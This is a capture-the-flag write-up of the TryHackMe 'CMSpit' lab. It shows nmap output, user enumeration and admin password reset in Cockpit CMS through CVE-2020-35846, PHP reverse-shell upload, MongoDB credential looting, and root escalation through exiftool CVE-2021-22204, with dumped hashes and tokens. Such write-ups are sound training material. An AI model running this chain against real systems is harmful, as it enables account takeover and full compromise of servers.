
[TryHackMe Link](https://tryhackme.com/room/cmspit){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```s linenums="1" hl_lines="6 11"
    # Nmap 7.93 scan initiated Fri Jul 21 14:02:45 2023 as: nmap -sC -sV -O -oN nmap.sh 10.10.168.33
    Nmap scan report for 10.10.168.33
    Host is up (0.19s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 7f25f9402325cd298b28a9d982f549e4 (RSA)
    |   256 0af429ed554319e773a7097930a8491b (ECDSA)
    |_  256 2f43ada3d15b648633075d94f9dca401 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    | http-title: Authenticate Please!
    |_Requested resource was /auth/login?to=/
    |_http-trane-info: Problem with XML parsing of /evox/about
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=7/21%OT=22%CT=1%CU=40882%PV=Y%DS=5%DC=I%G=Y%TM=64BA42E
    OS:7%P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%II=I%TS=8)SE
    OS:Q(SP=106%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW6%O2=M508ST1
    OS:1NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68
    OS:DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M5
    OS:08NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
    OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
    OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
    OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
    OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

    Network Distance: 5 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Jul 21 14:03:43 2023 -- 1 IP address (1 host up) scanned in 58.40 seconds

  ```
## <b>Questions</b>

- [ ] What is the name of the Content Management System (CMS) installed on the server?
- [ ] What is the version of the Content Management System (CMS) installed on the server?
- [ ] What is the path that allow user enumeration?
- [ ] How many users can you identify when you reproduce the user enumeration attack?
- [ ] What is the path that allows you to change user account passwords?
- [ ] Compromise the Content Management System (CMS). What is Skidy's email.
- [ ] What is the web flag?
- [ ] Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?
- [ ] What is the user.txt flag?
- [ ] What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000
- [ ] What is the utility used to create the PoC file?
- [ ] Escalate your privileges. What is the flag in root.txt?

## <b>Enumeration</b> 

Based on the Nmap scan results, I discovered that Port 80 is open on a server. Upon visiting the website, I found out that it was using the `'Cockpit'` CMS, and from the source code, I identified the CMS version as `0.11.1`.

<img id="image1" />

#### Source Code:

```
view-source:http://10.10.168.33/storage/tmp/4cc5a0d2487ec7f4c75b0cc9115bf601.js?ver=0.11.1
```

- [x] What is the name of the Content Management System (CMS) installed on the server? {==**Cockpit**==}
- [x] What is the version of the Content Management System (CMS) installed on the server? {==**0.11.1**==}

To gather more information, I did some research using `Searchsploit` and found a Python script that could be used for `'Username Enumeration & Password Reset'` on this version of the CMS. This code sends a HTTP request to `/auth/check` to identify usernames and `/auth/resetpassword` to reset the password. 

<img id="image2" />

By running the script, I was able to find `4 usernames`, and I also managed to discover the email address of a user `Skidy`.

#### Python Output:

```py
python3 50185.py -u http://$IP
[+] http://10.10.168.33: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']

[-] Get user details For : admin
[+] Finding Password reset tokens
         Tokens Found : ['rp-4c35308ff3bd8e12a91fd7ed16b2304764ba486b8b505']
[+] Obtaining user information 
-----------------Details--------------------
         [*] user : admin
         [*] name : Admin
         [*] email : admin@yourdomain.de
         [*] active : True
         [*] group : admin
         [*] password : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
         [*] i18n : en
         [*] _created : 1621655201
         [*] _modified : 1621655201
         [*] _id : 60a87ea165343539ee000300
         [*] _reset_token : rp-4c35308ff3bd8e12a91fd7ed16b2304764ba486b8b505
         [*] md5email : a11eea8bf873a483db461bb169beccec
--------------------------------------------
[+] Do you want to reset the passowrd for admin? (Y/n): Y
[-] Attempting to reset admin's password:
[+] Password Updated Succesfully!
[+] The New credentials for admin is: 
         Username : admin 
         Password : REDACTED

[-] Get user details For : skidy
[+] Finding Password reset tokens
         Tokens Found : ['rp-4d9268d18f1687dbcf79b07d07f2b68b64ba49a562ae7']
[+] Obtaining user information 
-----------------Details--------------------
         [*] user : skidy
         [*] email : skidy@tryhackme.fakemail
         [*] active : True
         [*] group : admin
         [*] i18n : en
         [*] api_key : account-21ca3cfc400e3e565cfcb0e3f6b96d
         [*] password : $2y$10$uiZPeUQNErlnYxbI5PsnLurWgvhOCW2LbPovpL05XTWY.jCUave6S
         [*] name : Skidy
         [*] _modified : 1621719311
         [*] _created : 1621719311
         [*] _id : 60a9790f393037a2e400006a
         [*] _reset_token : rp-4d9268d18f1687dbcf79b07d07f2b68b64ba49a562ae7
         [*] md5email : 5dfac21f8549f298b8ee60e4b90c0e66
--------------------------------------------

```

- [x] What is the path that allow user enumeration? {==**/auth/check**==}
- [x] How many users can you identify when you reproduce the user enumeration attack? {==**4**==}
- [x] What is the path that allows you to change user account passwords? {==**/auth/resetpassword**==}
- [x] Compromise the Content Management System (CMS). What is Skidy's email. {==**skidy@tryhackme.fakemail**==}

Next, I logged in through Admin credentials and explored the `'finder'` section of the website.

<img id="image3" />

I found a file named `webflag.php`. That gave me the answer for the first flag.

- [x] What is the web flag? {==**thm{REDACTED}**==}

## <b>Initial Access</b>

Knowing that Cockpit allows uploading source codes, I uploaded a PHP reverse shell (reverse-shell.php) to gain initial access to the server.

```HTTP
http://10.10.168.33/reverse-shell.php
```

<img id="image4" />

Once inside, I ran the `linpeas.sh` script to gather more details about the current user's permissions and capabilities.

<img id="image5" />

I noticed that the system was using a Mongo service on port `27017`. By accessing its table, I found the credentials for a user named `'stux'` and also discovered the `2nd flag`.

```sql
www-data@ubuntu:/$ mongo
MongoDB shell version: 2.6.10
connecting to: test
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
2023-07-21T02:11:57.954-0700 In File::open(), ::open for '' failed with errno:2 No such file or directory
> show dbs
admin         (empty)
local         0.078GB
sudousersbak  0.078GB
> use sudousersbak
switched to db sudousersbak
> show tables
flag
system.indexes
user
> db.flag.find()
{ "_id" : ObjectId("60a89f3aaadffb0ea68915fb"), "name" : "thm{REDACTED}" }
> 

> db.user.find()
{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "REDACTED!123" }
{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
> 
```

- [x] Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database? {==**thm{REDACTED}**==}

Using stux's credentials, I logged in and found the `user.txt` flag in the home folder.

- [x] What is the user.txt flag? {==**thm{REDACTED}**==}

## <b>Privilege Escalation</b>

After that, while checking sudo permissions with `sudo -l`, I noticed that the current user, `stux`, could execute `/usr/local/bin/exiftool` without a password. I found a vulnerability in exiftool, which allowed for `Arbitrary Code Execution`, by looking it up on `Searchsploit` and confirmed its CVE details through Google.

<img id="image6" />
<img id="image7" />

- [x] What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000 {==**CVE-2021-22204**==}

Then, I ran a Python code to create a malicious image file with a reverse shell using `djvumake`. 

<img id="image8" />

- [x] What is the utility used to create the PoC file? {==**djvumake**==}

Sending this malicious image to the victim, I executed exiftool with it, gaining a reverse shell with root privileges and ultimately obtaining the root flag.

```bash
sudo /usr/local/bin/exiftool image.jpg
```

<img id="image9" />

- [x] Escalate your privileges. What is the flag in root.txt? {==**thm{REDACTED}**==}


<script>

// JSON object
const data = {
    "desc": "This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.",
    "ip":  "10.10.168.33",
    "ports": "22/tcp,open,ssh;80/tcp,open,http",
    "difficulty":"medium",
    "id": "2"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>